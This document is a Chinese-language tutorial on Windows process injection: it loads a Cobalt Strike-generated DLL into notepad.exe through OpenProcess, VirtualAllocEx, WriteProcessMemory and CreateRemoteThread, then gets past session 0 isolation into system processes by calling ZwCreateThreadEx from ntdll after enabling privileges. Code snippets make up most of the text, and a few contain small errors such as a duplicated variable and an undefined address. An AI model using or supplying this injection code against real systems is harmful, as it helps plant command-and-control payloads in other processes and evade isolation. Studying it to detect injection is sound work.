### 0x01 dll远程线程注入

在windows当中我们的exe想要去加载dll可以通过调用`LoadLibrary`函数。

    
    
    HMODULE LoadLibraryA(
      [in] LPCSTR lpLibFileName
    );
    
    如果函数成功，则返回值是模块的句柄。
    
    如果函数失败，则返回值为 NULL。

首先我们通过cs生成一个dll。

我们能够使用`CreateRemoteThread`函数在其他进程地址空间中运行线程。也称之为远程线程。

    
    
    HANDLE CreateRemoteThread(
      [in]  HANDLE                 hProcess,
      [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
      [in]  SIZE_T                 dwStackSize,
      [in]  LPTHREAD_START_ROUTINE lpStartAddress,
      [in]  LPVOID                 lpParameter,
      [in]  DWORD                  dwCreationFlags,
      [out] LPDWORD                lpThreadId
    );

第一个函数是要在其中创建线程的进程句柄。

第四个函数表示在别的文件里面需要执行的地址。

第五个函数表示指向要传递给线程函数的变量的指针。

所以说我们第一步就说获取进程的句柄，这里我们拿`notepad.exe`进程来举例，首先我们需要去获取该进程的`pid`然后通过的`pid`通过`OpenProcess`函数去获取该进程的句柄。  
**获取进程pid**

    
    
    DWORD GetProcessPID(LPCTSTR lpProccessName) {
        DWORD pid = 0;
        PROCESSENTRY32 p32;
        HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (lpSnapshot == INVALID_HANDLE_VALUE) {
            printf("Get Process Error:%d", GetLastError());
            return pid;
        }
        p32.dwSize = sizeof(PROCESSENTRY32);
        ::Process32First(lpSnapshot, &p32);
        do {
            if (!lstrcmp(p32.szExeFile, lpProccessName)) {
                pid = p32.th32ProcessID;
                break;
            }
        } while (::Process32Next(lpSnapshot, &p32));
        ::CloseHandle(lpSnapshot);
        return pid;
    }

首先是`CreateToolhelp32Snapshot`函数。该函数是获取指定进程的快照，以及这些进程使用的堆、模块和线程。

    
    
    HANDLE CreateToolhelp32Snapshot(
      [in] DWORD dwFlags,
      [in] DWORD th32ProcessID
    );

TH32CS_SNAPPROCESS表示在快照中包含系统中的所有进程。第二个是要包含在快照中的进程的进程标识符。 此参数可以为零以指示当前进程。

![](./img/6601565209000071767.png)

接下来就可以使用`OpenProcess`函数打开`notepad.exe`进程获取句柄。

    
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pid);
    if (hProcess == NULL) {
        printf("Open Process Error:%d\n", GetLastError());
        return FALSE;
    }

当我们打开了`notepad`进程后继续向进程里面通过`VirtualAllocEx`申请空间。

    
    
    LPVOID VirtualAllocEx(
      [in]           HANDLE hProcess,
      [in, optional] LPVOID lpAddress,
      [in]           SIZE_T dwSize,
      [in]           DWORD  flAllocationType,
      [in]           DWORD  flProtect
    );

第三个函数表示大小，我们获取`dllpath`长度即可，这里为`LPCWSTR`，我们可以使用`(wcslen(dllpath) +
1)*sizeof(TCHAR)`。来获取。

    
    
    LPVOID hAllocMemory = VirtualAllocEx(hProcess, NULL, dllsize, MEM_COMMIT, PAGE_READWRITE);
    if (hAllocMemory == NULL) {
        printf("VirtualAllocEx Error:%d\n", GetLastError());
        return FALSE;
    }

当我们申请了空间后我们就需要向里面通过`WriteProcessMemory`写入dll路径

    
    
    BOOL WriteProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPVOID  lpBaseAddress,
      [in]  LPCVOID lpBuffer,
      [in]  SIZE_T  nSize,
      [out] SIZE_T  *lpNumberOfBytesWritten
    );
    
    如果函数成功，则返回值为非零。
    如果函数失败，则返回值为 0（零）。
    
    
    BOOL Write = WriteProcessMemory(hProcess, pAllocMemory, dllpath, dllsize, NULL);

接下来我们就去`kernel32.dll`里面获取`LoadLibraryW`函数的地址。再通过`CreateRemoteThread`函数去`notepad`进程里面去通过获取到的`LoadLibrary`的地址去加载申请的空间。

    
    
    FARPROC pThread = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    HANDLE pThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThread, pAllocMemory, 0, NULL);
    if (pThread == NULL) {
        printf("CreateRemoteThread Error:%d\n", GetLastError());
        return FALSE;
    }

接下来就是等待函数结束以及释放dll空间和关闭句柄。

    
    
    WaitForSingleObject(pThread, -1);
    VirtualFreeEx(pProcess, pAllocMemory, dllsize, MEM_DECOMMIT);
    CloseHandle(hProcess);

![](./img/6482116876914249789.png)

### 0x02 突破session 0注入

如果我们想注入到系统进程内，通常会失败，这是由于session 0隔离的原因。

我们使用到的`CreateRemoteThread`。函数是调用`kernel32.dll`。我们打开看看。

![](./img/9169458868714757391.png)

可以看到是调用的`kernelbase.dll`。

![](./img/7592638822069628885.png)

打开该dll搜索下`CreateRemoteThreadEx`可以看到调用了`NtCreateThreadEx`函数查看该函数

![](./img/1663149723404005725.png)

可以看到调用的是`ntdll.dll`。

![](./img/5323179545647571622.png)

查看伪代码

![](./img/9015203841446361898.png)

调用了`NtCreateThreadEx`函数。打开普通的`kernel32.dll`。

![](./img/2174786456665606273.png)

可以看到 `CreateThread`函数也是调用的 `CreateRemoteThreadEx`。

他们的区别就是如果是普通线程的话句柄值就为`-1`。远程线程的话句柄值就为打开的线程的句柄。

ZwCreateThreadEx函数比CreateRemoteThread函数更接近内核，CreateRemoteThread最终也是调用ZwCreateThreadEx函数来创建线程的。在内部调用ZwCreateThreadEx会把第七个参数创建标识设置为1，这样会使创建的线程挂起，这也是注入失败的原因。所以如果想要创建的线程成功执行我们需要将第七个参数指定为0，这样我们就能在创建线程后让他执行。

`ZwCreateThreadEx`在 ntdll.dll 中并没有声明，所以我们需要使用 GetProcAddress 从 ntdll.dll
中获取该函数的导出地址。  
我们需要注意的是64位和32位中,函数定义还不一样。

    
    
    #ifdef _WIN64
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        ULONG CreateThreadFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        LPVOID pUnkown);
    #else
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        BOOL CreateSuspended,
        DWORD dwStackSize,
        DWORD dw1,
        DWORD dw2,
        LPVOID pUnkown);
    #endif

首先还是获取进程的pid

    
    
    DWORD GetProcessPID(LPCTSTR lpProccessName) {
        DWORD pid = 0;
        PROCESSENTRY32 p32;
        HANDLE lpSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (lpSnapshot == INVALID_HANDLE_VALUE) {
            printf("Get Process Error:%d", GetLastError());
            return pid;
        }
        p32.dwSize = sizeof(PROCESSENTRY32);
        ::Process32First(lpSnapshot, &p32);
        do {
            if (!lstrcmp(p32.szExeFile, lpProccessName)) {
                pid = p32.th32ProcessID;
                break;
            }
        } while (::Process32Next(lpSnapshot, &p32));
        ::CloseHandle(lpSnapshot);
        return pid;
    }

0.提权

    
    
    BOOL EnbalePrivileges(HANDLE hProcess, char* pszPrivilegesName)
    {
        HANDLE hToken = NULL;
        LUID luidValue = { 0 };
        TOKEN_PRIVILEGES tokenPrivileges = { 0 };
        BOOL bRet = FALSE;
    
        bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
    
        bRet = LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);
    
        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges[0].Luid = luidValue;
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);
    
    
        return TRUE;
    }

1.打开进程

    
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

2.申请空间

    
    
    DWORD size = (wcslen(DllPath) + 1) * sizeof(TCHAR);
    LPVOID pAllocMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);

3.写入空间

    
    
    BOOL Write = WriteProcessMemory(hProcess, pAllocMemory, DllPath, size, NULL);

4.加载`ntdll.dll`。

    
    
    HMODULE hModNtdll = LoadLibrary(L"ntdll.dll");

5.获取`LoadLibrary`。

    
    
    FARPROC pThread =  GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

6.从`ntdll.dll`获取`ZwCreateThreadEx`

    
    
    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hModNtdll, "ZwCreateThreadEx");

7.创建远线程

    
    
    DWORD Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL,
            hProcess,
            addr, pAllocMemory, 0, 0, 0, 0, NULL);

8.其他

    
    
    CloseHandle(hProcess);
    FreeLibrary(hModNtdll);

![](./img/5645773435140119058.png)

